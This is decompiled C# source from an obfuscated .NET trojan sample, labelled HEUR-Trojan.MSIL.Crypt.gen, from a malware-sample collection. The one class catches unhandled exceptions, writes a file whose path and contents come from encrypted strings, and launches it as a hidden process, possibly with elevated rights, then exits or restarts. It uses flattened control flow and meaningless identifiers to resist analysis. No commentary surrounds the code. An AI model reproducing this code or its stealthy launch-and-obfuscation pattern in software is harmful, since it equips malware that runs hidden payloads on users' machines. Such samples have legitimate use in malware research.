// Decompiled with JetBrains decompiler
// Type: @Ԑ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

internal sealed class \u0040Ԑ
{
  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӓ(object _param0, object _param1)
  {
    try
    {
      foreach (object[] objArray in \u0040Ԓ.\u0040ә)
      {
        try
        {
          MethodInfo methodInfo = (MethodInfo) objArray[0];
          \u0040Ԑ.\u0040Ӣ();
          int num;
          if (\u0040Ԑ.\u0040ӡ())
            num = 2;
          else
            goto label_8;
label_7:
          switch (num)
          {
            case 0:
            case 2:
              \u0040Ԑ.\u0040ӕ((object) methodInfo, objArray[1], (object) new object[1]
              {
                \u0040Ԑ.\u0040Ӕ(_param1)
              });
              goto label_10;
            default:
              goto label_10;
          }
label_8:
          num = 3;
          if (\u0040Ԑ.\u0040Ӣ())
            goto label_7;
          else
            goto label_7;
        }
        catch
        {
        }
label_10:;
      }
    }
    catch
    {
    }
    \u0040ԝ.\u0040ܦ((string) \u0040Ԑ.\u0040Ӗ(4320), \u0040Ԑ.\u0040Ӕ(_param1).ToString());
    try
    {
      string str1 = (string) \u0040Ԑ.\u0040ӗ((object) \u0040ԝ.\u0040Ծ(), \u0040Ԑ.\u0040Ӗ(1604), (object) \u0040ԝ.\u0040\u05CB(10), \u0040Ԑ.\u0040Ӗ(1610));
      int num = 3;
      ProcessStartInfo processStartInfo1;
      string str2;
      while (true)
      {
        switch (num)
        {
          case 0:
            \u0040Ԑ.\u0040ӟ(0);
            num = 8;
            continue;
          case 1:
          case 4:
            \u0040Ԑ.\u0040ә((object) str1, (object) str2);
            goto case 2;
          case 2:
          case 5:
            ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
            \u0040Ԑ.\u0040Ӛ((object) processStartInfo2, ProcessWindowStyle.Hidden);
            \u0040Ԑ.\u0040ӛ((object) processStartInfo2, \u0040ԝ.\u0040؜() ? \u0040Ԑ.\u0040Ӗ(1884) : (object) "");
            \u0040Ԑ.\u0040Ӝ((object) processStartInfo2, true);
            \u0040Ԑ.\u0040ӝ((object) processStartInfo2, (object) str1);
            processStartInfo1 = processStartInfo2;
            goto case 7;
          case 3:
            str2 = (string) \u0040Ԑ.\u0040Ә((object) new string[5]
            {
              (string) \u0040Ԑ.\u0040Ӗ(4352),
              (string) \u0040ԑ.\u0040ӓ,
              (string) \u0040Ԑ.\u0040Ӗ(1840),
              str1,
              (string) \u0040Ԑ.\u0040Ӗ(1878)
            });
            if (\u0040Ԑ.\u0040ӡ())
            {
              if (!\u0040Ԑ.\u0040Ӣ())
              {
                num = 4;
                continue;
              }
              goto case 6;
            }
            else
            {
              num = 5;
              continue;
            }
          case 6:
            \u0040ԝ.\u0040ֆ();
            num = 0;
            continue;
          case 7:
            \u0040Ԑ.\u0040Ӟ((object) processStartInfo1);
            num = 6;
            continue;
          case 8:
            goto label_25;
          default:
            num = 7;
            continue;
        }
      }
label_25:;
    }
    catch
    {
      \u0040ԝ.\u0040ֆ();
      \u0040Ԑ.\u0040Ӡ();
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0040Ԑ()
  {
    \u0040Ԑ.\u0040ӣ();
    \u0040Ԑ.\u0040Ӥ((object) this);
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӕ(object _param0) => ((UnhandledExceptionEventArgs) _param0).ExceptionObject;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӕ(object _param0, object _param1, object _param2) => ((MethodBase) _param0).Invoke(_param1, (object[]) _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӗ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӗ(object _param0, object _param1, object _param2, object _param3) => (object) ((string) _param0 + (string) _param1 + (string) _param2 + (string) _param3);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ә(object _param0) => (object) string.Concat((string[]) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ә(object _param0, object _param1) => File.WriteAllText((string) _param0, (string) _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӛ(object _param0, ProcessWindowStyle _param1) => ((ProcessStartInfo) _param0).WindowStyle = _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӛ(object _param0, object _param1) => ((ProcessStartInfo) _param0).Verb = (string) _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӝ(object _param0, bool _param1) => ((ProcessStartInfo) _param0).UseShellExecute = _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӝ(object _param0, object _param1) => ((ProcessStartInfo) _param0).FileName = (string) _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӟ(object _param0) => (object) Process.Start((ProcessStartInfo) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӟ(int _param0) => Environment.Exit(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӡ() => Application.Restart();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӡ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӣ() => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӣ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӥ(object _param0) => _param0.\u002Ector();
}
